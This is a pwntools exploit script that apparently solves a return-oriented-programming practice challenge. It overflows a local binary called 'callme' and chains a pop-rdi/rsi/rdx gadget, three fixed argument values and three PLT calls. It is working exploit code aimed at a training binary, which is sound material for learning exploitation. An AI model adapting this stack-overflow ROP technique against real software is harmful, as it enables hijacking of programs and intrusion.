from pwn import *

elf = ELF('./callme')
io = elf.process()

pause()


io.recvuntil(b"> ")
#io.sendline(b"AAAAAAAA")

pld = b""
pld += b"A" * 40
pld += p64(0x000000000040093c) # : pop rdi ; pop rsi ; pop rdx ; ret
pld += p64(0xdeadbeefdeadbeef)
pld += p64(0xcafebabecafebabe)
pld += p64(0xd00df00dd00df00d)
pld += p64(0x00000000004006be) # ret gadget
pld += p64(elf.plt['callme_one'])

pld += p64(0x000000000040093c) # : pop rdi ; pop rsi ; pop rdx ; ret
pld += p64(0xdeadbeefdeadbeef)
pld += p64(0xcafebabecafebabe)
pld += p64(0xd00df00dd00df00d)
pld += p64(0x00000000004006be) # ret gadget
pld += p64(elf.plt['callme_two'])

pld += p64(0x000000000040093c) # : pop rdi ; pop rsi ; pop rdx ; ret
pld += p64(0xdeadbeefdeadbeef)
pld += p64(0xcafebabecafebabe)
pld += p64(0xd00df00dd00df00d)
pld += p64(0x00000000004006be) # ret gadget
pld += p64(elf.plt['callme_three'])

io.sendline(pld)

io.interactive()
